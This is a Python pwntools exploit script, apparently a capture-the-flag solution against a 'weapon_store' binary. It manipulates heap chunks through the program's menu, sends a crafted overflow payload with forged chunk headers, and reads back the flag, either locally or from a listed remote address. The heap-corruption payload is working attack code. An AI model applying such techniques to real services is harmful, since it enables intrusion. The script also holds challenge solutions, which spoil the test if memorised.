from pwn import *
debug=1
#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
if debug:
    io = process("./weapon_store")#,env={'LD_PRELOAD':'./libc-2.27.so'})
else:
    io = remote("47.97.253.115",10002)
elf = ELF('./weapon_store')
libc = ELF("./libc-2.27.so")
s = lambda x            :io.send(str(x))
sa = lambda x,y         :io.sendafter(str(x), str(y))
sl  = lambda x      :io.sendline(str(x))
sla  = lambda x,y    :io.sendlineafter(str(x), str(y))
r = lambda x             :io.recv(x)
ru = lambda x      :io.recvuntil(x)
def view():
    ru("Your choice:")
    sl(1)
def buy(which,amount):
    ru("Your choice:")
    sl(2)
    ru("Which do you want to buy:")
    sl(which)
    ru("How many do you want to buy:")
    sl(amount)
#1 2 3 4 171 271 371 471
#money 0x1000 4096
def checkout():
     ru("Your choice:")
     sl(3)
#buy(1,1)#c0
buy(1,2)#160
#buy(1,3)#20
#buy(1,4)#c0
#buy(1,5)#160
#buy(1,6)#20
buy(1,2)#160
checkout()
buy(1,9)
buy(1,9)
buy(1,9)#20
buy(4,0x8b2468)#160
checkout()
ru("Do you want to remove a weapon?(y/n)\n")
sl("y")
ru('Please tell us about the reason why you are so poor:')
s("2"*0x158+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*3+p64(0x31)+p32(0x603)+p32(9)+p64(0)+'\x20')
checkout()
ru("3. Name:       ")
log.success("flag : "+ru("Price:")[:-6])
#gdb.attach(io)
#io.interactive()